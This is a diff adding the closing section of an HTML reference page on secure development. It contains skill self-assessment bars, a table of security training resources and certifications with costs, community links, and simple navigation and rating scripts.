+    <div class="sb-row"><div class="sb-label">Security requirements & design</div><div class="sb-cat">PROCESS</div><div class="sb-track" data-color="var(--c-proc)"><div class="sb-fill" style="background:var(--c-proc)"></div></div><div class="sb-val">— click to rate —</div></div>
+    <div class="sb-row"><div class="sb-label">SAST / SCA tooling in active use</div><div class="sb-cat">TOOLING</div><div class="sb-track" data-color="var(--c-tool)"><div class="sb-fill" style="background:var(--c-tool)"></div></div><div class="sb-val">— click to rate —</div></div>
+    <div class="sb-row"><div class="sb-label">Dependency / supply chain hygiene</div><div class="sb-cat">TOOLING</div><div class="sb-track" data-color="var(--c-tool)"><div class="sb-fill" style="background:var(--c-tool)"></div></div><div class="sb-val">— click to rate —</div></div>
+    <div class="sb-row"><div class="sb-label">Security gates in CI/CD pipeline</div><div class="sb-cat">TOOLING</div><div class="sb-track" data-color="var(--c-tool)"><div class="sb-fill" style="background:var(--c-tool)"></div></div><div class="sb-val">— click to rate —</div></div>
+    <div class="sb-row"><div class="sb-label">Continuous learning / staying current</div><div class="sb-cat">GROWTH</div><div class="sb-track" data-color="var(--c-grow)"><div class="sb-fill" style="background:var(--c-grow)"></div></div><div class="sb-val">— click to rate —</div></div>
+  </div>
+
+  <div class="sec">Certifications &amp; Formal Learning</div>
+  <table class="cert-table">
+    <thead><tr><th>Resource / Certification</th><th>Level</th><th>Focus</th><th>Cost</th></tr></thead>
+    <tbody>
+      <tr><td>PortSwigger Web Security Academy</td><td class="l1c">Beginner–Intermediate</td><td>Hands-on web vulnerability labs — 40+ topics with real labs</td><td><span class="free">Free</span></td></tr>
+      <tr><td>OWASP Juice Shop</td><td class="l1c">Beginner</td><td>Gamified vulnerable app: attack it and learn from each finding</td><td><span class="free">Free</span></td></tr>
+      <tr><td>TryHackMe / HackTheBox</td><td class="l1c">Beginner–Advanced</td><td>Structured security labs across all domains with learning paths</td><td><span class="free">Free tier</span> + paid</td></tr>
+      <tr><td>PentesterLab</td><td class="l2c">Intermediate</td><td>Real CVE-based labs for web, code review, authentication</td><td><span class="free">Free tier</span> + paid</td></tr>
+      <tr><td>eWPTX (eLearnSecurity)</td><td class="l2c">Intermediate</td><td>Web penetration testing — builds deep attacker intuition</td><td><span class="paid">€200–400</span></td></tr>
+      <tr><td>GWEB (GIAC)</td><td class="l2c">Intermediate</td><td>Web app security for defenders and developers — highly practical</td><td><span class="paid">~$1,900</span></td></tr>
+      <tr><td>CSSLP (ISC²)</td><td class="l2c">Intermediate</td><td>Certified Secure Software Lifecycle Professional — industry standard</td><td><span class="paid">~$599 + exp</span></td></tr>
+      <tr><td>OSCP (OffSec)</td><td class="l3c">Advanced</td><td>Offensive security certification — the gold standard for attacker mindset</td><td><span class="paid">~$1,499</span></td></tr>
+      <tr><td>AWS/Azure/GCP Security Specialty</td><td class="l2c">Intermediate</td><td>Cloud-specific security for your platform of choice</td><td><span class="paid">~$300</span></td></tr>
+    </tbody>
+  </table>
+
+  <div class="strip ok">
+    <span class="si">🎯</span>
+    <div class="st"><strong>Start with free resources first.</strong> PortSwigger Web Security Academy, OWASP Juice Shop, and this reference series take you from zero to practitioner — without spending anything. Certifications add value once you have a practical foundation, not before. The single best investment is <strong>practice time in labs</strong>, not expensive courses. The highest ROI activity for a developer new to security: attack OWASP Juice Shop for 10 hours, then review your own most-used codebase with the checklists from panel 04.</div>
+  </div>
+
+  <div class="toolbox c-grow">
+    <h3>🌐 Communities, Blogs &amp; News</h3>
+    <div class="tool-row">
+      <a class="tp" href="https://owasp.org/" target="_blank">OWASP Foundation</a>
+      <a class="tp" href="https://portswigger.net/web-security" target="_blank">PortSwigger Academy</a>
+      <a class="tp" href="https://googleprojectzero.blogspot.com/" target="_blank">Google Project Zero</a>
+      <a class="tp" href="https://krebsonsecurity.com/" target="_blank">Krebs on Security</a>
+      <a class="tp" href="https://www.securecodewarrior.com/" target="_blank">Secure Code Warrior</a>
+      <a class="tp" href="https://www.securityjourney.com/" target="_blank">Security Journey</a>
+      <a class="tp" href="https://www.reddit.com/r/netsec/" target="_blank">/r/netsec</a>
+      <a class="tp" href="https://www.sans.org/reading-room/" target="_blank">SANS Reading Room</a>
+      <a class="tp" href="https://owaspsamm.org/" target="_blank">OWASP SAMM</a>
+      <a class="tp" href="https://csrc.nist.gov/projects/ssdf" target="_blank">NIST SSDF</a>
+    </div>
+  </div>
+</div>
+
+</div><!-- /wrap -->
+
+<script>
+// Panel navigation
+function go(i) {
+  document.querySelectorAll('.panel').forEach((p, j) => p.classList.toggle('on', j === i));
+  document.querySelectorAll('.nb').forEach((b, j) => b.classList.toggle('on', j === i));
+  window.scrollTo({ top: document.querySelector('.nav').offsetTop - 20, behavior: 'smooth' });
+}
+
+// Interactive self-assessment bars
+const labels = ['', 'Never heard of it', 'I know it exists', 'I can apply it', 'I do it regularly', 'I could teach it'];
+document.querySelectorAll('.sb-track').forEach(track => {
+  const fill  = track.querySelector('.sb-fill');
+  const row   = track.closest('.sb-row');
+  const val   = row.querySelector('.sb-val');
+
+  ['click', 'touchend'].forEach(evt => {
+    track.addEventListener(evt, e => {
+      e.preventDefault();
+      const rect = track.getBoundingClientRect();
+      const clientX = e.touches ? e.touches[0].clientX : e.clientX;
+      const pct  = Math.max(0, Math.min(1, (clientX - rect.left) / rect.width));
+      const step = Math.max(1, Math.round(pct * 5));
+      fill.style.width = (step / 5 * 100) + '%';
+      val.textContent  = labels[step];
+      val.style.color  = ['','#79c0ff','#e3b341','#f59e0b','#3fb950','var(--accent)'][step];
+      val.style.opacity = '1';
+    });
+  });
+  track.style.cursor = 'pointer';
+});
+
+function setLang(lang) {
+  document.body.className = 'lang-' + lang;
+  document.querySelectorAll('.lang-btn').forEach(b => b.classList.toggle('active', b.textContent.toLowerCase() === lang));
+}
+</script>
+</body>
+</html>
